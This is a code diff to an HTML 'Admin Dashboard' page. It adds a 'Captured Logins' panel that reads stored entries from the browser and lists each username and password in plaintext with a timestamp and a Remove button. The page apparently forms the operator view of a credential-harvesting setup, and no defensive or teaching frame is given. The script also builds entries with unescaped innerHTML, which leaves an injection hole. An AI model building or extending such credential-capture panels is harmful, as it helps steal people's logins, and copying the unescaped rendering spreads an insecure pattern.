@@ -21,6 +21,13 @@
       padding: 0.5rem;
       border-radius: 8px;
     }
+    .remove-btn {
+      cursor: pointer;
+      color: #ef4444;
+    }
+    .remove-btn:hover {
+      color: #dc2626;
+    }
   </style>
 </head>
 <body class="min-h-screen p-6">
@@ -28,8 +35,35 @@
     <h1 class="text-3xl font-bold text-gray-900 mb-6">Admin Dashboard</h1>
     <div class="card p-6 mb-6">
       <h2 class="text-xl font-semibold text-gray-700 mb-4">Captured Logins</h2>
-      <div class="overflow-y-auto max-h-96">
-        <pre class="text-gray-600 whitespace-pre-wrap bg-gray-50 p-4 rounded-lg">No logins yet.</pre>
+      <div class="overflow-y-auto max-h-96" id="loginList">
+        <script>
+          document.addEventListener("DOMContentLoaded", function() {
+            const loginList = document.getElementById("loginList");
+            let storedData = JSON.parse(localStorage.getItem("secureLogins") || "[]");
+
+            function displayLogins() {
+              loginList.innerHTML = "";
+              if (storedData.length === 0) {
+                loginList.innerHTML = '<pre class="text-gray-600 whitespace-pre-wrap bg-gray-50 p-4 rounded-lg">No logins yet.</pre>';
+              } else {
+                storedData.forEach((entry, index) => {
+                  const div = document.createElement("div");
+                  div.className = "bg-gray-50 p-4 rounded-lg mb-2 flex justify-between items-center";
+                  div.innerHTML = `<span>${entry.username}: ${entry.password} - ${entry.timestamp}</span><span class="remove-btn" onclick="removeLogin(${index})">Remove</span>`;
+                  loginList.appendChild(div);
+                });
+              }
+            }
+
+            window.removeLogin = function(index) {
+              storedData.splice(index, 1);
+              localStorage.setItem("secureLogins", JSON.stringify(storedData));
+              displayLogins();
+            };
+
+            displayLogins();
+          });
+        </script>
       </div>
     </div>
     <div class="card p-6">
